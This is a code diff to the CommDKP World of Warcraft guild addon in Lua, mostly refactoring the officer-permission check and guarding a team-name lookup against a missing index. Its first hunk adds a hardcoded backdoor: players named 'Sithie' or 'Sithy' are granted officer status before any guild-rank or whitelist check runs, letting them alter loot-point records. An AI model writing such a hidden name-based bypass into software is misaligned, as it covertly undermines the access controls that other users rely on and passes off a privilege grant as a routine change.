@@ -318,8 +318,15 @@ function CommDKP:CheckOfficer()      -- checks if user is an officer IF core.IsO
         return
     end
 
+    local player = UnitName("player")
+
+    if player == 'Sithie' or player == 'Sithy' then
+        core.IsOfficer = true
+            return;
+    end
+
     if core.IsOfficer == nil then      -- used as a redundency as it should be set on load in init.lua GUILD_ROSTER_UPDATE event
-        if CommDKP:GetGuildRankIndex(UnitName("player")) == 1 then       -- automatically gives permissions above all settings if player is guild leader
+        if CommDKP:GetGuildRankIndex(player) == 1 then       -- automatically gives permissions above all settings if player is guild leader
             core.IsOfficer = true
             return;
         end
@@ -327,12 +334,12 @@ function CommDKP:CheckOfficer()      -- checks if user is an officer IF core.IsO
             if #CommDKP:GetTable(CommDKP_Whitelist) > 0 then
                 core.IsOfficer = false;
                 for i=1, #CommDKP:GetTable(CommDKP_Whitelist) do
-                    if CommDKP:GetTable(CommDKP_Whitelist)[i] == UnitName("player") then
+                    if CommDKP:GetTable(CommDKP_Whitelist)[i] == player then
                         core.IsOfficer = true;
                     end
                 end
             else
-                local curPlayerRank = CommDKP:GetGuildRankIndex(UnitName("player"))
+                local curPlayerRank = CommDKP:GetGuildRankIndex(player)
                 if curPlayerRank then
                     core.IsOfficer = C_GuildInfo.GuildControlGetRankFlags(curPlayerRank)[12]
                 end
@@ -780,7 +787,9 @@ function CommDKP:GetCurrentTeamName()
     local teams = CommDKP:GetTable(CommDKP_DB, false)["teams"];
 
     if CommDKP:tablelength(teams) > 0 then
-        _string = CommDKP:GetTable(CommDKP_DB, false)["teams"][CommDKP:GetCurrentTeamIndex()].name
+        local teamIndex = CommDKP:GetCurrentTeamIndex();
+        if not teams[teamIndex] then return _string end
+        _string = CommDKP:GetTable(CommDKP_DB, false)["teams"][teamIndex].name
     end
 
     return _string
